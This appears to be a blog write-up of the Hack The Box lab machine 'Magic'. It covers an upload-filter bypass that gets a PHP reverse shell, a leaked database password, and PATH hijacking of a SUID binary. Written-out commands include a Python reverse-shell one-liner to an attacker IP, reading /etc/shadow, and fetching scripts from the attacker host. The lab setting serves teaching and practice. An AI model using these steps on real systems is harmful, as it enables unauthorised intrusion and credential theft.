![Magic]({{ site.baseurl }}/images/magic/magic.png "Magic")

## Foreword
I actually should start doing machines again as there are no reversing challenges and this uhh... is my job or something like that.

## Starting out
Let's start by doing a nmap scan
```bash
nmap -p- magic.htb
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

Okay only ssh and a http server.
Let's browse to that:

![http view]({{ site.baseurl }}/images/magic/http.png "http view")

There is a login link which leads to login.php...

![Login form]({{ site.baseurl }}/images/magic/login.png "Login form")

Tried some simple sqli but didn't work. Let's whip out sqlmap.
> sqlmap -u magic.htb/login.php --forms

Doesn't work either...
Send Dirb!

```

---- Entering directory: http://magic.htb/www/ ----
```

A public key? When using `ssh-keygen -lf id_rsa.pub` it shows a 3072 bit key. Too high too crack.

And now look for php files:

```
dirb http://magic.htb/ -X .php

---- Scanning URL: http://magic.htb/ ----
+ http://magic.htb/index.php (CODE:200|SIZE:4517)

+ http://magic.htb/upload.php (CODE:302|SIZE:2957)  
```

That seems more interesting...  
When browsing to it, it just opens login.php though.
So no luck here.  
Curl'ing it shows that it's 302 and just wants you to redirect, but still sends the page...
> curl magic.htb/upload.php

Well how about no?  
_I just copied the response html to a local file and changed the links as I found no way to disable the redirect in firefox. You could possibly change the response with burp or do something else._

![Upload]({{ site.baseurl }}/images/magic/upload.png "Upload")

Let's try uploading a image and catching the request with burp.
If we upload a image it returns
> The file image.jpg has been uploaded.

We then can find our image on the main page. It's saved under `/images/uploads/image.jpg`.

If we send any other file, it alerts with
> Sorry, only JPG, JPEG & PNG files are allowed.

Okay maybe we can bypass this. First let's just change the filename to image.jpg.
> What are you trying to do there?

So does it check the content too? Or maybe just the content type.  
Let's change that to `image/jpeg`, but still no success.

Maybe try appending php code at the end of the image and maybe it get's interpreted as php code?

```php
...JFIF...
...
<?php
echo "hello"
?>
```

![Image Error]({{ site.baseurl }}/images/magic/imageError.png "Image Error")

It still get's served as an image.  
Maybe change the name to .php.jpg?

![Echo hello]({{ site.baseurl }}/images/magic/hello.png "Echo hello")

Well hello there. I already removed the most of the jpg bytes, till we're only left with the jpg magic bytes.

Let's get our Reverse Shell (/usr/share/webshells/php/php-reverse-shell.php)

> nc -lvp 443

And after browsing to our "image", we're greeted in our shell with:
```
www-data
Linux ubuntu 5.3.0-42-generic #34~18.04.1-Ubuntu SMP Fri Feb 28 13:42:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

The user.txt is located in `/home/theseus`.  
First transfer a enum script:

```bash
python3 -m http.server
wget http://x.x.x.x:8000/linenum.sh
```

Not much interesting stuff here, except:

Netstat says there are two internal ports: 631 (CUPS) and 3306 (mysql)
> netstat -tupln

Okay a database? Let's look the in the login.php, as it should probably access the database.  
The login.php has no login data, but includes `db.php5`.  
In there we find:

```
private static $dbName = 'Magic' ;
private static $dbHost = 'localhost' ;
private static $dbUsername = 'theseus';
private static $dbUserPassword = 'iamkingtheseus';
```

Let's dump the Magic database with `mysqldump`.

>mysqldump Magic -u theseus -p

```sql

Let's try logging into theseus with that
> su theseus

It works and we can now access the user.txt:
```bash
cat user.txt
**********be46e59ef6bef4ef9bc381
```

## Privilege Escalation

That shell is fucky. Let's upgrade to something better.
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
stty raw -echo
fg
reset
```

If we run the PrivEsc Script now we can see a bit more.
Not much more, but we see a suid binary called /bin/sysinfo.

If we run that we get information about the system, like memory status, drives, etc. - basically what you would expect from a sysinfo binary.

Let's look at what this programm does with pspy32. Open another shell and run /bin/sysinfo.
We can see that uid 0 runs lhsw and fdisk -l.  
_You could probably just run strings on it to find that out too_  
Can we somehow hijack this?

First let's change our Path:
```bash
PATH=/tmp:$PATH
```

Add a fdisk binary inside /tmp:
```bash
cd /tmp
echo "cat /etc/shadow" > fdisk
chmod +x fdisk
```

If we now run sysinfo, we see `Permission denied` between the other hardware stuff.  
Oh probably should specify the whole path.  
Now we can see the shadow content... But I don't wanna crack the pw, let's send a shell to us back.

```bash
vi fdisk

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

chmod +x fdisk
```

Now listen on port 443 and run our sysinfo (this time the full path)
```bash
nc -lvp 443
/bin/sysinfo
```

And we're root!
```bash
cat root.txt
**********eab9fbe4773b2b5722934a
```
